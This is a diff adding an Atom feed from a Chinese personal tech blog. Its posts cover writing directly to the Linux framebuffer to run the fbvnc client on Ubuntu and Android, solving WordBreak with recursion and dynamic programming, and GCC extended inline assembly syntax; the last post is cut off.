@@ -1,0 +1,2935 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Han]]></title>
+  <link href="http://hanjc.me/atom.xml" rel="self"/>
+  <link href="http://hanjc.me/"/>
+  <updated>2014-05-20T21:42:39+08:00</updated>
+  <id>http://hanjc.me/</id>
+  <author>
+    <name><![CDATA[Zealoct]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[如何写 Ubuntu 的 Framebuffer]]></title>
+    <link href="http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc/"/>
+    <updated>2014-05-20T20:26:25+08:00</updated>
+    <id>http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc</id>
+    <content type="html"><![CDATA[<p>最近有个小项目，想在 Android 上跑一个通过直接读写 framebuffer 实现的 vnc 客户端，
+所以发现了这个 <a href="https://github.com/zohead/fbvnc">fbvnc</a>， 是 github 上一个小哥儿捣鼓的，基于现有的一个同名项目开发，专为嵌入式设备使用。这个小的 vnc 客户端的不足当然有很多，比如连基本的窗口都木有，直接占用了你整个 framebuffer，不能调整分辨率，巨慢无比，卡的紧了就直接挂，但是它有一个最大的优点，就是真的非常简单，除了一些基本的 Linux 库之外没有任何第三方的依赖。</p>
+
+<p>以上算是个小广告吧 (=</p>
+
+<p>但是一个很大的问题是，这货在 ubuntu 上不 work……什么原因呢，做个小测试看一看。</p>
+
+<!-- more -->
+
+
+<h2>Ubuntu 下修改 Framebuffer</h2>
+
+<p>其实之前我写过小程序测试直接写 ubuntu 下的 <a href="https://wiki.ubuntu.com/FrameBuffer">framebuffer</a> 的，当时也是神马效果都木有，当时只是猜测和 x11 或 unity 有关，也没深究，这次为了跑 fbvnc，特意去搜了下，后来在 <a href="http://unix.stackexchange.com/questions/58420/writes-to-framebuffer-dev-fb0-do-not-seem-to-change-graphics-screen">这里</a> 找到了<strong>解决方法</strong>：需要置上 <code>FB_ACTIVATE_NOW</code> 和 <code>FB_ACTIVATE_FORCE</code> 属性，具体代码如下：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">vinfo</span><span class="p">.</span><span class="n">activate</span> <span class="o">|=</span> <span class="n">FB_ACTIVATE_NOW</span> <span class="o">|</span> <span class="n">FB_ACTIVATE_FORCE</span><span class="p">;</span>
+</span><span class='line'><span class="n">ioctl</span><span class="p">(</span><span class="n">fbfd</span><span class="p">,</span> <span class="n">FBIOPUT_VSCREENINFO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vinfo</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>加上这段代码之后，我写的测试程序终于可以看到修改屏幕的效果了！</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;linux/fb.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">fbfd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fb_var_screeninfo</span> <span class="n">vinfo</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fb_fix_screeninfo</span> <span class="n">finfo</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">long</span> <span class="kt">int</span> <span class="n">screensize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">fbp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="err">，</span><span class="n">color</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">long</span> <span class="kt">int</span> <span class="n">location</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="cm">/* 打开 fb 设备文件 */</span>
+</span><span class='line'>    <span class="n">fbfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/fb0&quot;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">ioctl</span><span class="p">(</span><span class="n">fbfd</span><span class="p">,</span> <span class="n">FBIOGET_FSCREENINFO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">finfo</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">ioctl</span><span class="p">(</span><span class="n">fbfd</span><span class="p">,</span> <span class="n">FBIOGET_VSCREENINFO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vinfo</span><span class="p">);</span>
+</span><span class='line'>    <span class="cm">/* 把 fb 映射到内存 */</span>
+</span><span class='line'>    <span class="n">screensize</span> <span class="o">=</span> <span class="n">vinfo</span><span class="p">.</span><span class="n">xres</span> <span class="o">*</span> <span class="n">vinfo</span><span class="p">.</span><span class="n">yres</span> <span class="o">*</span> <span class="n">vinfo</span><span class="p">.</span><span class="n">bits_per_pixel</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">fbp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">screensize</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span><span class="n">fbfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="cm">/* 置上FB_ACTIVATE_NOW 和 FB_ACTIVATE_FORCE */</span>
+</span><span class='line'>    <span class="n">vinfo</span><span class="p">.</span><span class="n">activate</span> <span class="o">|=</span> <span class="n">FB_ACTIVATE_NOW</span> <span class="o">|</span> <span class="n">FB_ACTIVATE_FORCE</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">ioctl</span><span class="p">(</span><span class="n">fbfd</span><span class="p">,</span> <span class="n">FBIOPUT_VSCREENINFO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vinfo</span><span class="p">);</span>
+</span><span class='line'>    <span class="cm">/* 渐变修改 fb */</span>
+</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">color</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="n">color</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">color</span> <span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">x</span> <span class="o">=</span> <span class="mi">100</span> <span class="p">;</span><span class="n">x</span> <span class="o">&lt;</span> <span class="mi">200</span> <span class="p">;</span><span class="n">x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="k">for</span><span class="p">(</span><span class="n">y</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">;</span> <span class="n">y</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">location</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="o">+</span><span class="n">vinfo</span><span class="p">.</span><span class="n">xoffset</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">vinfo</span><span class="p">.</span><span class="n">bits_per_pixel</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">vinfo</span><span class="p">.</span><span class="n">yoffset</span><span class="p">)</span> <span class="o">*</span> <span class="n">finfo</span><span class="p">.</span><span class="n">line_length</span><span class="p">;</span>
+</span><span class='line'>                <span class="o">*</span><span class="p">(</span><span class="n">fbp</span> <span class="o">+</span> <span class="n">location</span><span class="p">)</span> <span class="o">=</span> <span class="n">color</span><span class="p">;</span> <span class="cm">/* B */</span>
+</span><span class='line'>                <span class="o">*</span><span class="p">(</span><span class="n">fbp</span> <span class="o">+</span> <span class="n">location</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* G */</span>
+</span><span class='line'>                <span class="o">*</span><span class="p">(</span><span class="n">fbp</span> <span class="o">+</span> <span class="n">location</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* R */</span>
+</span><span class='line'>                <span class="o">*</span><span class="p">(</span><span class="n">fbp</span> <span class="o">+</span> <span class="n">location</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* A */</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">usleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">munmap</span><span class="p">(</span><span class="n">fbp</span><span class="p">,</span> <span class="n">screensize</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">close</span><span class="p">(</span><span class="n">fbfd</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>不过我预期中的效果是直接在当前屏幕上多出一个渐变的蓝色色块，实际效果是在一个纯黑背景上。看来还是和 x11 的实现有关，不过我不了解 x11，所以并不清楚具体的原因是什么，仿佛 x11 并没有这么简单的使用 fb。</p>
+
+<p>除此之外，其实还有<strong>另一个</strong>更加方便和人畜无害的方法去直接操作 framebuffer，那就是切到其他的 tty 去执行。</p>
+
+<h2>Ubuntu 下运行 fbvnc</h2>
+
+<p>根据 fbvnc 的 Readme，在 Ubuntu 下运行需要修改 fbvnc.c 下的</p>
+
+<pre><code>typedef unsigned short fbval_t;
+</code></pre>
+
+<p>为</p>
+
+<pre><code>typedef unsigned int fbval_t;
+</code></pre>
+
+<p>在 fbvnc 的源码中加入了修改 activate 属性的代码之后，执行成功！</p>
+
+<p>等等，怎么退出……不得已 ssh 上去强制 kill 了 fbvnc 进程，结果我擦整个桌面都不好了，完全黑屏没有反映啊，切换到 tty6 关闭了很多工作的 tmux 窗口之后，回到 tty7 发现又好了，果然会有奇怪的问题，怪不得大家建议在 Linux 下不要直接修改 framebuffer，而是利用 X window 接口。</p>
+
+<p>如果直接在 tty6 中执行 fbvnc 就正常多了，可惜性能实在太差，几乎不能用，而且还容易挂。</p>
+
+<h2>Android 下编译运行 fbvnc</h2>
+
+<p>简单写个 Android 应用然后把 fbvnc 代码拷进去这种方法肯定不够，普通应用没有操作 framebuffer 的权限。我把 fbvnc 放到了 Android 源码 external 目录下，然后重新编译了 android 镜像。为了成功编译，需要做如下修改：</p>
+
+<ol>
+<li>注释掉 fbvnc.c 中所有的 dprintf，bionic 不支持此函数；</li>
+<li>在 fbvnc.c 中把调用 getpass 函数那一行改成硬编码，或者自己实现个 getpass，bionic 也不支持此函数；</li>
+<li>修改 draw.h 中的 FBDEV_PATH 为 &ldquo;/dev/graphics/fb0&#8221;，Android 中 fb 设备路径和 Linux 默认路径不同；</li>
+<li>在 fbvnc/ 下添加如下文件</li>
+</ol>
+
+
+<figure class='code'><figcaption><span>Android.mk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>LOCAL_PATH:= $(call my-dir)
+</span><span class='line'>
+</span><span class='line'>include $(CLEAR_VARS)
+</span><span class='line'>LOCAL_CFLAGS:= -Wall -Os
+</span><span class='line'>LOCAL_MODULE_TAGS:= debug eng
+</span><span class='line'>LOCAL_MODULE:= fbvnc
+</span><span class='line'>LOCAL_SRC_FILES:= d3des.c draw.c vncauth.c fbvnc.c
+</span><span class='line'>LOCAL_C_INCLUDES := $(LOCAL_PATH)
+</span><span class='line'>LOCAL_SHARED_LIBRARIES := \
+</span><span class='line'>        libcutils
+</span><span class='line'>include $(BUILD_EXECUTABLE)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OK，编译！好了之后 adb shell 上去，用 root 权限执行</p>
+
+<pre><code>fbenv myhostname
+</code></pre>
+
+<p>成功显示了远程 vnc 桌面，不过并不持久，很快就会被 Android 自己的界面刷掉。如果要解决这个问题，需要对 Android 系统进行更多的修改，以后有时间再写一篇吧。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[简单的递归和动态规划]]></title>
+    <link href="http://hanjc.me/blog/2014/04/05/recursion-and-dp/"/>
+    <updated>2014-04-05T13:31:50+08:00</updated>
+    <id>http://hanjc.me/blog/2014/04/05/recursion-and-dp</id>
+    <content type="html"><![CDATA[<h3>题目：WordBreak</h3>
+
+<p>首先定义如下表示</p>
+
+<p><strong>str[n:m] </strong>为字符串 str 从下标 n 开始到下标 m-1 的字串</p>
+
+<p>例如 str = &ldquo;abcdef&rdquo; str[4:6] = &ldquo;ef&#8221;，str[1:3] = &#8220;bc&#8221;，str[3:4] = &#8220;d&rdquo;</p>
+
+<p><strong>str[n:] </strong>为字符串从下标 n 开始直到字符串结束的子串</p>
+
+<p>例如 str = &ldquo;abcdef&rdquo; str[2:] = ”cdef“</p>
+
+<p><strong>str[:m] </strong>为字符串从头开始直到下标 m-1 的子串</p>
+
+<p>例如 str = &ldquo;abcdef&rdquo; str[:3] = ”abc“</p>
+
+<p><strong>stat[n] </strong>表示子串 str[n:] 能不能用字典中的单词表示</p>
+
+<!-- more -->
+
+
+<p>假设字符串长度是 L，那么字符下标从 0 到 L-1，定义 stat[L] = True （因为 str[L:] 是空字符串）</p>
+
+<p>这道题的目标是计算 stat[0]，为了计算 stat[n]，我们有如下<strong>递归方程</strong></p>
+
+<pre><code>stat[n] = 
+{ dict.contains( str[n:n+1] ) &amp;&amp; stat[n+1] } ||
+{ dict.contains( str[n:n+2] ) &amp;&amp; stat[n+2] } ||
+...
+{ dict.contains( str[n:L] ) &amp;&amp; stat[L] }
+</code></pre>
+
+<p>其中花括号括起来的部分 <code>dict.contains( str[n:n+m] ) &amp;&amp; stat[n+m]</code> 表示：子串 str[n:] 的前 m 个字符组成的子字符串是字典中的单词，并且，子串 str[n+m:] 可以被字典中的单词组成</p>
+
+<p>只要有任意一个 m 满足上述语句，就可以说 stat[n] 为 True！</p>
+
+<p>对于<strong>递归思想</strong>来说，我们<strong>从等式左边到右边</strong>，不去管函数具体怎么解决子问题的，只是<strong>给出如何把问题分解为更小的子问题的方法</strong>。</p>
+
+<p>所以一个递归方法去解这道题就是：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">bool</span> <span class="n">stat</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">n</span> <span class="o">=</span> <span class="n">L</span> <span class="p">{</span> <span class="k">return</span> <span class="bp">True</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="n">n</span><span class="o">+</span><span class="mf">1.</span><span class="o">.</span><span class="n">L</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c">#依次计算每一个花括号，任何一个为 True 就返回 True</span>
+</span><span class='line'>        <span class="k">if</span> <span class="nb">dict</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">n</span><span class="p">:</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">stat</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">return</span> <span class="bp">True</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c">#所有花括号都是 False，返回 False</span>
+</span><span class='line'>    <span class="k">return</span> <span class="bp">False</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这跟你写的那个递归方法是一样的，只不过我参数里用的并不是一个真正的字符串，而是用一个数字表示当前子字符串是从那个下标开始的。</p>
+
+<p>递归方法的一个问题就是<strong>重复计算</strong>，比如 str=&ldquo;aaaaab&rdquo;, dict = [&ldquo;a&rdquo;, &ldquo;aa&rdquo;, &ldquo;aaa&rdquo;, &ldquo;aaaa&rdquo;, &ldquo;aaaaa&rdquo;] 这个问题，当你计算 stat(&ldquo;aaaaab&rdquo;) 和 stat(&ldquo;aaaab&rdquo;) 的时候都要去计算 stat(&ldquo;aaab&rdquo;)，字符串越长，递归调用层数越深，这个问题越明显。</p>
+
+<p>如何解决重复计算的问题，一个直观的方法就是，每当我计算完一个 stat(n) 的值的时候，我把 stat(n) 缓存下来，下次再需要计算 stat(n) 的时候我直接返回，而不去计算。这种思想用递归写是这样的：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">boole</span> <span class="n">stat_cache</span><span class="p">[</span><span class="n">L</span><span class="p">];</span> <span class="c">#缓存 stat[n] 的结果</span>
+</span><span class='line'><span class="n">boole</span> <span class="n">stat_calced</span><span class="p">[</span><span class="n">L</span><span class="p">];</span> <span class="c">#标识 stat[n] 是否已计算</span>
+</span><span class='line'><span class="nb">bool</span> <span class="n">stat</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">n</span> <span class="o">=</span> <span class="n">L</span> <span class="p">{</span> <span class="k">return</span> <span class="bp">True</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="n">stat_calced</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="p">{</span> <span class="k">return</span> <span class="n">stat_cache</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">stat_calced</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="n">n</span><span class="o">+</span><span class="mf">1.</span><span class="o">.</span><span class="n">L</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c">#依次计算每一个花括号，任何一个为 True 就返回 True</span>
+</span><span class='line'>        <span class="k">if</span> <span class="nb">dict</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">n</span><span class="p">:</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">stat</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>            <span class="n">stat_cache</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>            <span class="k">return</span> <span class="bp">True</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c">#所有花括号都是 False，返回 False</span>
+</span><span class='line'>    <span class="n">stat_cache</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>    <span class="k">return</span> <span class="bp">False</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>我没有试过，这种方法应该已经可以解决超时的问题了，但是这种方法还是会出现多层函数调用栈，而且需要一个额外的 stat_calced 数组，怎么办嘞？</p>
+
+<p>我们再去看看那个递归方程，发现要计算 stat[n] 的值，我们需要知道 stat[n+1]&hellip;stat[L] 的值，这次我们换个方向思考，从<strong>等式右边到左边</strong>，先把右边需要用到的都计算好，然后再计算 stat[n]，先尝试解决子问题，进而解决更大的问题，这就是<strong>动态规划的方法</strong>，在这里，递归方程被称为<strong>状态转移方程</strong>。</p>
+
+<p>已知计算 stat[n] 需要 stat[n+1]..stat[L]，而计算 stat[n+1] 需要 stat[n+2]..stat[L]，一步步退下来，我们从 stat[L] 开始，一步步往前算。当然，递归也好，动态规划也好，都需要一个<strong>根</strong>，就像数学归纳法中的 base 一样，这一题中我们的根就是 stat[L] = True</p>
+
+<p>所以我们的代码应该是这个样子的：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">for</span> <span class="n">n</span> <span class="o">=</span> <span class="n">L</span><span class="o">-</span><span class="mi">1</span> <span class="o">..</span> <span class="mi">0</span> <span class="p">{</span> <span class="c">#loop1</span>
+</span><span class='line'>    <span class="c">#假设所有花括号都是 False</span>
+</span><span class='line'>    <span class="n">stat</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="n">n</span><span class="o">+</span><span class="mf">1.</span><span class="o">.</span><span class="n">L</span> <span class="p">{</span> <span class="c">#loop2</span>
+</span><span class='line'>        <span class="c">#依次计算每一个花括号，任何一个为 True 就返回 True</span>
+</span><span class='line'>        <span class="k">if</span> <span class="nb">dict</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">n</span><span class="p">:</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">stat</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>            <span class="n">stat</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>            <span class="k">break</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>注意在上述代码中，loop1 相当于递归方法中的函数调用，都是对 n 做轮询，不同的是递归是从 0 到 L-1 轮询，而这里是从 L-1 到 0 来轮询。而 loop2 和递归函数中的循环是一模一样的。</p>
+
+<p>总结一下，递归的思想是这样的，我要算 stat[n]，那我就直接开始算 stat[n]（递归调用从stat(0)开始，直接尝试计算 stat[0] ），算到算不下去了（发现计算 stat[0] 需要 stat[1] ），那就把当前的执行压栈，然后去算 stat[1]。而动态规划的思想是这样的，我先观察，发现 stat[0] 需要 stat[1]，而 stat[1] 又需要 stat[2]，最终发现 stat[L] 不依赖任何人，直接是 True，那么这时候知道了 stat[L] 我就可以算 stat[L-1]，进而可以算 stat[L-2]，然后一步步算出 stat[0]。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux 下 c 的扩展内联汇编]]></title>
+    <link href="http://hanjc.me/blog/2014/03/05/c-asm/"/>
+    <updated>2014-03-05T19:54:09+08:00</updated>
+    <id>http://hanjc.me/blog/2014/03/05/c-asm</id>
+    <content type="html"><![CDATA[<p>简单总结了一下自己看到用到的一些内联汇编的知识点，并不是一个完整的总结，以后对内联汇编有了新的了解会慢慢扩充。</p>
+
+<p>详细细节可以参考 gcc 关与扩展内联汇编的 <a href="http://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#Extended-Asm">文档</a></p>
+
+<h2>格式说明</h2>
+
+<pre><code>__asm__　__volatile__("Instruction List" : Output : Input : Clobber/Modify)
+</code></pre>
+
+<p>冒号的使用原则（<em>O, I, C 分别指代 Output, Input, Clobber/Modify</em>）：</p>
+
+<ol>
+<li>C 为空，第三个冒号必须省略</li>
+<li>O、I 为空时，前边的冒号（第一、二个）可选择性省略</li>
+<li>O，I，C 中任何一个不为空，则之前的冒号均必须保留，如只有 I 不为空时，O 和 I 之前的冒号必须保留，只有 C 不为空时三个冒号都必须保留</li>
+</ol>
+
+
+<p>合法的调用包括</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot; &quot;</span> <span class="o">:</span> <span class="o">:</span> <span class="o">:</span> <span class="s">&quot;memory&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot; &quot;</span> <span class="o">:</span> <span class="o">:</span><span class="p">);</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %1, %%eax&quot;</span> <span class="o">:</span> <span class="s">&quot;=a&quot;</span><span class="p">(</span><span class="n">var_a</span><span class="p">));</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %1, %%eax&quot;</span> <span class="o">:</span> <span class="s">&quot;=a&quot;</span><span class="p">(</span><span class="n">var_a</span><span class="p">)</span> <span class="o">:</span><span class="p">);</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %%edx, %%eax&quot;</span> <span class="o">:</span> <span class="s">&quot;=a&quot;</span><span class="p">(</span><span class="n">var_a</span><span class="p">)</span> <span class="o">:</span> <span class="s">&quot;d&quot;</span><span class="p">(</span><span class="n">var_d</span><span class="p">));</span>
+</span><span class='line'><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov %%edx, %%eax&quot;</span> <span class="o">:</span> <span class="s">&quot;=a&quot;</span><span class="p">(</span><span class="n">var_a</span><span class="p">)</span> <span class="o">:</span> <span class="o">:</span> <span class="s">&quot;ebx&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
